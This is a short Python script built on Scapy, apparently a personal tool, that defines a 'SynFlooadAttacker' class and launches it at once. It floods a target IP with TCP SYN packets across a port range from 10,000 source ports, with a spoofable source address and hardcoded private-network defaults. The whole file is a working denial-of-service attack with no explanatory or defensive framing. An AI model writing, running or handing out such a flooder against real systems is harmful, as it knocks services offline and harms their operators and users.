
from scapy.all import *
from scapy.layers.inet import TCP,IP


class SynFlooadAttacker():
    def __init__(self):
        self.target = "192.168.1.104"
        self.source = "192.168.1.103"
        self.low    = 0
        self.high   = 81

    def setTargetAndSource(self):
        self.target = input("Please input target ip :")
        self.source = input("Please input source ip :")
        self.low    = input("Please input lower bound of destination port :")
        self.high   = input("Please input higher bound of destination port:")

    def attack(self):
        #self.setTargetAndSource()
        for sport in range(0,10000):
            for dport in range(int(self.low),int(self.high)):
                send(IP(src=self.source,dst=self.target)/TCP(sport=sport,dport=dport))


atk = SynFlooadAttacker()
atk.attack()